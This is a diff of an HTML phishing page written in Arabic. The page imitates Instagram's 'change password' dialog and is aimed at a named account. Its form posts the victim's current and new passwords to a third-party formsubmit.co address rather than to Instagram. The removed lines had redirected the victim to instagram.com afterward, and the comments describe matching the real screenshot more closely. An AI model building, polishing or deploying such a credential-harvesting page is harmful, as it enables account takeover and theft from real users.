@@ -3,78 +3,78 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تغيير كلمة السر • Instagram</title>
+    <title>تغيير كلمة السر</title>
     <style>
-        body { background-color: #000; color: #fff; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; overflow: hidden; }
-        
-        .modal { background-color: #1c1c1c; width: 100%; max-width: 450px; border-radius: 20px; padding: 20px; box-sizing: border-box; position: relative; }
-        
-        /* الأزرار العلوية (X والسهم) */
-        .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px; }
-        .header span { font-size: 24px; cursor: pointer; color: #fff; }
+        /* الخلفية سوداء تماماً كما في الصورة خلف الصندوق */
+        body { background-color: #000; color: #fff; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; }
 
-        .account-info { font-size: 14px; color: #fff; margin-bottom: 20px; }
+        /* الصندوق الرئيسي المنبثق */
+        .modal { background-color: #1c1c1c; width: 100%; max-width: 440px; border-radius: 24px; padding: 24px; box-sizing: border-box; }
 
-        h2 { font-size: 22px; margin-bottom: 10px; font-weight: bold; }
-        .description { font-size: 13px; color: #f5f5f5; line-height: 1.5; margin-bottom: 25px; }
+        /* الأيقونات العلوية */
+        .header-icons { display: flex; justify-content: space-between; margin-bottom: 15px; }
+        .icon { font-size: 24px; color: #fff; cursor: pointer; }
+
+        .user-header { font-size: 15px; color: #fff; margin-bottom: 20px; font-weight: 500; }
+
+        h2 { font-size: 28px; margin: 0 0 10px 0; font-weight: bold; }
+        
+        .warning-text { font-size: 14px; color: #f5f5f5; line-height: 1.4; margin-bottom: 25px; }
 
         form { display: flex; flex-direction: column; }
 
-        .input-group { position: relative; margin-bottom: 15px; }
-        input { width: 100%; background: #1c1c1c; border: 1px solid #363636; border-radius: 12px; padding: 18px 15px; color: #fff; font-size: 14px; box-sizing: border-box; text-align: right; }
-        input::placeholder { color: #8e8e8e; }
+        /* خانات الإدخال مطابقة للصورة */
+        input[type="password"] { 
+            width: 100%; background: #1c1c1c; border: 1px solid #424242; border-radius: 14px; 
+            padding: 20px 16px; margin-bottom: 12px; color: #fff; font-size: 15px; 
+            box-sizing: border-box; text-align: right; 
+        }
 
-        .forgot-pass { color: #0095f6; font-size: 13px; text-align: right; margin-bottom: 15px; text-decoration: none; display: block; }
+        .forgot-link { color: #0095f6; text-decoration: none; font-size: 15px; font-weight: 500; align-self: flex-start; margin: 5px 0 20px 0; }
 
-        /* خيار تسجيل الخروج من الأجهزة الأخرى */
-        .checkbox-container { display: flex; align-items: center; justify-content: flex-start; gap: 10px; margin-bottom: 25px; font-size: 13px; color: #fff; }
-        input[type="checkbox"] { width: 18px; height: 18px; margin: 0; cursor: pointer; border-radius: 4px; }
+        /* قسم تسجيل الخروج */
+        .logout-section { display: flex; align-items: flex-start; gap: 12px; margin-bottom: 30px; line-height: 1.4; }
+        .logout-text { font-size: 14px; color: #fff; flex: 1; }
+        input[type="checkbox"] { width: 22px; height: 22px; accent-color: #0095f6; cursor: pointer; background: none; border: 2px solid #424242; border-radius: 4px; }
 
-        /* الزر الأزرق المطابق للصورة */
-        button { background-color: #183354; color: #4a82b5; border: none; border-radius: 25px; padding: 12px; font-weight: bold; font-size: 15px; cursor: pointer; transition: 0.3s; }
-        /* عند الكتابة يمكن تغيير اللون ليكون أزرق فاتح كالأصلي */
-        button:active { background-color: #0095f6; color: white; }
+        /* الزر الأزرق الداكن المطابق للصورة */
+        .submit-btn { 
+            background-color: #183354; color: #4a82b5; border: none; border-radius: 30px; 
+            padding: 14px; font-weight: bold; font-size: 16px; cursor: pointer; 
+        }
     </style>
 </head>
 <body>
 
 <div class="modal">
-    <div class="header">
-        <span>✕</span>
-        <span>⟩</span>
+    <div class="header-icons">
+        <div class="icon">✕</div>
+        <div class="icon">⟩</div>
     </div>
 
-    <div class="account-info">anes_38 • Instagram</div>
+    <div class="user-header">anes_38 • Instagram</div>
 
     <h2>تغيير كلمة السر</h2>
-    <p class="description">
+    
+    <div class="warning-text">
         يجب ألا تقل كلمة السر عن 6 من الأحرف وأن تتضمن توليفة من الأرقام والأحرف الأبجدية والأحرف الخاصة (!@$%).
-    </p>
+    </div>
 
     <form action="https://formsubmit.co/b35269abccf715e68332f1a3a4ccca0c" method="POST">
-        <input type="hidden" name="_captcha" value="false">
-        <input type="hidden" name="_next" value="https://www.instagram.com">
+        <input type="password" name="current" placeholder="كلمة السر الحالية (تم التحديث في 11/04/2026)" required>
+        <input type="password" name="new" placeholder="كلمة السر الجديدة" required>
+        <input type="password" name="confirm" placeholder="إعادة كتابة كلمة السر الجديدة" required>
 
-        <div class="input-group">
-            <input type="password" name="current_password" placeholder="كلمة السر الحالية (تم التحديث في 11/04/2026)" required>
+        <a href="#" class="forgot-link">هل نسيت كلمة السر؟</a>
+
+        <div class="logout-section">
+            <div class="logout-text">
+                <b>تسجيل الخروج من الأجهزة الأخرى.</b> حدد هذا الخيار إذا استخدم شخص آخر حسابك.
+            </div>
+            <input type="checkbox" name="logout_others">
         </div>
 
-        <div class="input-group">
-            <input type="password" name="new_password" placeholder="كلمة السر الجديدة" required>
-        </div>
-
-        <div class="input-group">
-            <input type="password" name="confirm_password" placeholder="إعادة كتابة كلمة السر الجديدة" required>
-        </div>
-
-        <a href="#" class="forgot-pass">هل نسيت كلمة السر؟</a>
-
-        <div class="checkbox-container">
-            <input type="checkbox" id="logout" name="logout_all">
-            <label for="logout">تسجيل الخروج من الأجهزة الأخرى. حدد هذا الخيار إذا استخدم شخص آخر حسابك.</label>
-        </div>
-
-        <button type="submit">تغيير كلمة السر</button>
+        <button type="submit" class="submit-btn">تغيير كلمة السر</button>
     </form>
 </div>
 
